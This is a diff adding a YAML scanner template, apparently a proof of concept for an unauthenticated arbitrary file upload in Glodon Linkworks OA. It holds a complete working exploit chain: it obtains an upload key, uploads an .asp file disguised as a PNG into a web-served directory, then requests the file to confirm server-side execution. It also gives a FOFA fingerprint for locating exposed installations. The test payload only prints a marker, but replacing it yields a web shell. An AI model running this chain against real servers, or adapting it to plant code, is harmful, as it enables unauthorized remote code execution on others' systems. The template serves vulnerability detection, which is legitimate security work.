@@ -1,0 +1,67 @@
+id: poc-yaml-glodon-getauthorizekey-userfilesupload
+info:
+  name: 广联达OA前台 UserFilesUpload 任意文件上传
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 广联达 Linkworks办公OA
+  fofa: fid="/yV4r5PdARKT4jaqLjJYqw=="
+variables:
+  filename: to_lower(random_str(6))
+requests:
+- method: POST
+  path: /Services/FileService/UserFiles/GetAuthorizeKey.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd=&destDir=./sysinfo/&destFilename={{.filename}}.asp
+  expression: 'status_code == 200
+
+    '
+  output:
+  - regex_match(body,"key:\"(?P<key>.*?)\"")
+- method: POST
+  path: /Services/FileService/UserFiles/UserFilesUpload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+  data: '------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="key"
+
+
+    {{.key}}
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="destDir"
+
+
+    ./sysinfo/
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="destFilename"
+
+
+    {{.filename}}.asp
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="file";filename="{{.filename}}.asp"
+
+    content-type:image/png
+
+
+    <% response.write("This website has a vulnerability")%>
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"已存储为")
+
+    '
+- method: GET
+  path: /UserFiles/sysinfo/{{.filename}}.asp
+  expression: "status_code == 200 && \ntrim(body) == \"This website has a vulnerability\"\
+    \n"
+transport: http
